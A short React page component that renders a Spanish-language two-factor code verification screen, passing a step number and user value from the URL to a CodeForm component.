import Logo from "./components/Logo";
import CodeForm from "./components/CodeForm";

export default function CodePage({ searchParams }) {
  const initialStep = parseInt(searchParams?.step, 10) || 1;
  const user = searchParams?.user || "";

  return (
    <main className="svp-main">
      <div className="bc-container-fluid trazo" style={{ backgroundImage: "url(/assets/images/trazo.svg)" }}>
        <Logo />
        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
          Verificación de código 2FA
        </h1>

        <div className="bc-row bc-justify-content-center form-container">
          <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
            <CodeForm initialStep={initialStep} user={user} />
          </div>
        </div>
      </div>
    </main>
  );
}
